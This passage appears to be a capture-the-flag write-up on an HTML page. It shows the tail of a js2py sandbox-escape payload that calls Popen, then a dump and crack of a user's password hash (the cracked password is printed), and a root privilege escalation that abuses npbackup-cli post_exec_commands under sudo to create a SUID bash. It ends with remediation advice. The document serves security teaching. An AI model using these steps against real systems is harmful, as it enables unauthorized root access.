+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">__name__</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s2">&quot;type&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">findpopen</span><span class="p">(</span><span class="nx">item</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">n11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">findpopen</span><span class="p">(</span><span class="nx">obj</span><span class="p">)(</span><span class="nx">cmd</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">).</span><span class="nx">communicate</span><span class="p">();</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">n11</span><span class="p">);</span>
+<span class="nx">n11</span><span class="p">;</span>
+</code></pre></div>
+<hr />
+<h2 id="post-exploitation-enumeration">Post-Exploitation Enumeration<a class="headerlink" href="#post-exploitation-enumeration" title="Permanent link">&para;</a></h2>
+<p>With a shell obtained, I began enumerating the system. Inside <code>/home</code>, I discovered another user <strong>marco</strong></p>
+<p><img alt="home" src="../assets/home.png" /></p>
+<p>I recalled that the application database <code>users.db</code> was empty when accessed locally. Since I now had server access, I inspected it again.</p>
+<div class="highlight"><pre><span></span><code>sqlite3<span class="w"> </span>users.db
+
+sqlite&gt;<span class="w"> </span>.tables
+sqlite&gt;<span class="w"> </span>SELECT<span class="w"> </span>*<span class="w"> </span>FROM<span class="w"> </span>user<span class="p">;</span>
+</code></pre></div>
+<p>This time, the database contained password hashes for multiple users, including <strong>marco</strong>, <strong>app</strong>, and the user account I had created earlier (<strong>johhny</strong>).</p>
+<p><img alt="sqlite2" src="../assets/sqlite2.png" /></p>
+<p>My target was <strong>marco</strong>.</p>
+<hr />
+<h2 id="credential-cracking-lateral-movement">Credential Cracking &amp; Lateral Movement<a class="headerlink" href="#credential-cracking-lateral-movement" title="Permanent link">&para;</a></h2>
+<p>I copied Marco’s password hash and submitted it to crackstation.net. The hash cracked successfully.</p>
+<ul>
+<li><strong>Password:</strong> <code>sweetangelbabylove</code></li>
+</ul>
+<p><img alt="crackstation" src="../assets/crackstation.png" /></p>
+<p>Using these credentials, I logged in as Marco via SSH and retrieved the user flag.</p>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>marco@&lt;TARGET-IP&gt;
+</code></pre></div>
+<p><img alt="user-flag" src="../assets/user-flag.png" /></p>
+<hr />
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>With access to marco’s account via SSH, I checked his sudo privileges as the first Privilege Escalation vector.</p>
+<p>The output revealed that Marco could run the following command <strong>as any user without a password</strong></p>
+<div class="highlight"><pre><span></span><code>/usr/local/bin/npbackup-cli
+</code></pre></div>
+<p><img alt="sudo-l" src="../assets/sudo-l.png" /></p>
+<hr />
+<h2 id="privilege-escalation-npbackup-cli-abuse">Privilege Escalation: npbackup-cli Abuse<a class="headerlink" href="#privilege-escalation-npbackup-cli-abuse" title="Permanent link">&para;</a></h2>
+<h3 id="background">Background<a class="headerlink" href="#background" title="Permanent link">&para;</a></h3>
+<p><code>npbackup-cli</code> is a Python-based backup utility that uses <strong>restic</strong>. It reads a YAML configuration file (<code>npbackup.conf</code>) which supports execution of commands after backup completion via <code>post_exec_commands</code>.</p>
+<p>The vulnerability here is a <strong>sudo misconfiguration</strong>. Marco is allowed to run <code>npbackup-cli</code> as root, meaning any commands defined in the configuration file will be executed with full root privileges.</p>
+<hr />
+<h3 id="exploitation-steps">Exploitation Steps<a class="headerlink" href="#exploitation-steps" title="Permanent link">&para;</a></h3>
+<p>The default configuration file in <code>/home/marco</code> was owned by root and could not be edited.</p>
+<p>img21</p>
+<p>I thus copied it to <code>/tmp</code>, which is writable.</p>
+<div class="highlight"><pre><span></span><code>cp<span class="w"> </span>/home/marco/npbackup.conf<span class="w"> </span>/tmp/npbackup.conf
+</code></pre></div>
+<p><img alt="cp" src="../assets/cp.png" /></p>
+<p>I modified the copied configuration to target the <code>/root</code> directory and added commands to create a SUID root shell.</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/npbackup.conf<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">conf_version: 3.0.1</span>
+<span class="s">audience: public</span>
+<span class="s">repos:</span>
+<span class="s">  default:</span>
+<span class="s">    repo_uri: /tmp/dummy-repo</span>
+<span class="s">    repo_group: default_group</span>
+<span class="s">    backup_opts:</span>
+<span class="s">      paths:</span>
+<span class="s">        - /root</span>
+<span class="s">      source_type: folder_list</span>
+<span class="s">    repo_opts:</span>
+<span class="s">      repo_password: dummy</span>
+<span class="s">      retention_policy: {}</span>
+<span class="s">groups:</span>
+<span class="s">  default_group:</span>
+<span class="s">    backup_opts:</span>
+<span class="s">      post_exec_commands:</span>
+<span class="s">        - cp /bin/bash /tmp/rootbash</span>
+<span class="s">        - chmod u+s /tmp/rootbash</span>
+<span class="s">EOF</span>
+</code></pre></div>
+<p><img alt="cat" src="../assets/cat.png" /></p>
+<p>I ensured the file was writable.</p>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span><span class="m">666</span><span class="w"> </span>/tmp/npbackup.conf
+</code></pre></div>
+<p><img alt="chmod" src="../assets/chmod.png" /></p>
+<p>I then executed the backup as root.</p>
+<div class="highlight"><pre><span></span><code>sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -b
+</code></pre></div>
+<p><img alt="npbackup" src="./assets/npbackup" /></p>
+<p>Even though an error appeared, the post-execution commands had already run.</p>
+<hr />
+<h2 id="root-access">Root Access<a class="headerlink" href="#root-access" title="Permanent link">&para;</a></h2>
+<p>I spawned a root shell using the SUID binary.</p>
+<div class="highlight"><pre><span></span><code>/tmp/rootbash -p
+</code></pre></div>
+<p><img alt="rootbash" src="../assets/rootbash.png" /></p>
+<p>Finally, I retrieved the root flag.</p>
+<div class="highlight"><pre><span></span><code>cat /root/root.txt
+</code></pre></div>
+<p><img alt="rootflag" src="../assets/root-flag.png" /></p>
+<p>Room Completed</p>
+<p><img alt="poc" src="../assets/poc.png" /></p>
+<hr />
+<h2 id="remediation-hardening-recommendations">Remediation &amp; Hardening Recommendations<a class="headerlink" href="#remediation-hardening-recommendations" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p><strong>Do not execute user-supplied code server-side</strong>. If required, isolate execution using containers or dedicated sandboxing solutions.</p>
+</li>
+<li>
+<p><strong>Update or remove vulnerable dependencies</strong>, particularly outdated libraries such as js2py.</p>
+</li>
+<li>
+<p><strong>Remove hardcoded secrets</strong> from source code and store them securely using environment variables.    </p>
+</li>
+<li>
+<p><strong>Restrict database file permissions</strong> to prevent unauthorized access to credential data.</p>
+</li>
+<li>
+<p><strong>Harden sudo configurations</strong> by avoiding unrestricted execution of scripts or tools like <code>npbackup-cli</code>, especially those supporting command execution hooks.</p>
+</li>
+</ul>
+<hr />
+<h2 id="lessons-learned">Lessons Learned<a class="headerlink" href="#lessons-learned" title="Permanent link">&para;</a></h2>
+<p>This machine shows how small misconfigurations can combine into a full compromise. Executing user-supplied code, outdated libraries, and exposed secrets made it easy to escalate from a web app to root. It’s a strong reminder to enforce least privilege, manage dependencies, and secure sensitive data</p>
+<hr />
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.sections", "header.autohide", "content.code.copy", "content.action.edit", "content.code.annotate", "navigation.top", "palette.toggle"], "search": "../../../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
